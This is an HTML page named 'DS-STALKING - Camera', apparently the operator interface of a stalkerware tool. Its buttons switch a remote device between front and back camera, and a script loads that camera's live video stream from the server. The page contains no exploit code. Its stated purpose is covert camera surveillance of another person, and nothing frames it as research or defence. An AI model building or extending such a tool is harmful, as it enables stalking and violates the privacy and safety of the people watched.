<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DS-STALKING - Camera</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
</head>
<body>
    <h1>DS-STALKING - Camera</h1>

    <button onclick="changeCamera('front')">Caméra avant</button>
    <button onclick="changeCamera('back')">Caméra arrière</button>

    <h2>Flux Vidéo</h2>
    <video id="video" width="640" height="480" controls autoplay></video>

    <script>
        const socket = io(); // Connexion à SocketIO

        // Fonction pour changer de caméra
        function changeCamera(cameraType) {
            fetch("/change_camera", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ camera: cameraType })
            }).then(response => response.json())
              .then(data => {
                  console.log(data);
              }).catch(error => console.error(error));
        }

        // Initialiser la vidéo à partir du lien généré
        fetch("/stream_link", {
            method: "POST"
        })
        .then(response => response.json())
        .then(data => {
            const video = document.getElementById('video');
            video.src = data.stream_url;
        }).catch(error => console.error(error));
    </script>
</body>
</html>